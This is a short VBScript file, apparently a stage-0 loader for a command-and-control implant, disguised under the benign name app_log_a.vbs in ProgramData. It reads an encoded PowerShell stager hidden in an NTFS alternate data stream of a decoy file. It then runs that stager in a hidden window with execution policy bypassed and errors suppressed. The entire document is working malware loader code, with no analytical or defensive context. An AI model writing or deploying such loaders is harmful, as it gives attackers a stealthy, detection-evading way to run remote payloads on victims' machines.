' C:\ProgramData\app_log_a.vbs
' ADS-Drop-System Stage 0 Loader: Reads Imix Stager from ADS and Executes.

On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")

' Path to the Alternate Data Stream containing the Realm Imix PowerShell Stager
ADSPath = "C:\ProgramData\SystemCache.dat:syc_core"

' --- 1. Read PowerShell Stager from ADS using ADODB.Stream ---
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 2 ' Specify text mode.
objStream.Charset = "utf-8"
objStream.Open

objStream.LoadFromFile ADSPath ' Load the ADS content (Realm's stager)

' The ADS stream contains Realm's full, encoded PowerShell command (The Stager)
PowerShellStager = objStream.ReadText

objStream.Close
Set objStream = Nothing

' --- 2. Execute the PowerShell Stager invisibly ---
' The stager is executed directly as a command. No need for -e as it is already the command itself.
' We use -Command and pass the stager, which is already an encoded command.
PowerShellCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command """ & PowerShellStager & """"
WshShell.Run PowerShellCmd, 0, False
